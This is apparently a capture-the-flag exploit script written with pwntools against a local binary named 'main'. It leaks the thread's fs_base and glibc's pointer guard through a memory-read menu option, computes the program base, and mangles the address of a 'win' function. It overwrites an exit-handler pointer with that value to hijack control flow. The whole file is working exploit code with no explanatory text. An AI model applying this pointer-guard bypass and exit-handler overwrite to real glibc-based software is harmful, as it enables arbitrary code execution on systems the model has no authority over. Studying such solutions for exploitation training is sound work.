from pwn import *
p = process("./main")
elf = ELF("./main", checksec = 0)

rol = lambda val, r_bits, max_bits: \
    (val << r_bits%max_bits) & (2**max_bits-1) | \
    ((val & (2**max_bits-1)) >> (max_bits-(r_bits%max_bits)))

def encrypt(v, key):
    return p64(rol(v ^ key, 0x11, 64))


ror = lambda val, r_bits, max_bits: \
    ((val & (2**max_bits-1)) >> r_bits%max_bits) | \
    (val << (max_bits-(r_bits%max_bits)) & (2**max_bits-1))

p.sendlineafter(b"choice: ", b"1337")
p.recvuntil(b"always ")
fs_base = int(p.recvline().strip(b"\n"), 16)

print(hex(fs_base))
print(hex(fs_base + 0x1d6bd8))

p.sendlineafter(b"choice: ", b"1")
p.sendline(str(fs_base + 0x30))
p.recvuntil(b"data : ")
pointer_guard = int(p.recvline().strip(b"\n"), 16)
print(hex(pointer_guard))

p.sendlineafter(b"choice: ", b"1")
p.sendline(str(fs_base + 0x1d6bd8 + 0x10))
p.recvuntil(b"data : ")
elf.address = int(p.recvline().strip(b"\n"), 16) - 0x4040 + 0x38
print(hex(elf.address))
encrypted = u64(encrypt(elf.sym.win, pointer_guard))
print(hex(encrypted))
gdb.attach(p)
p.sendlineafter(b"choice: ", b"2")
p.sendline(str(fs_base + 0x1d6bd8))
p.sendline(str(encrypted))
p.sendlineafter(b"choice: ", b"0")

p.interactive()
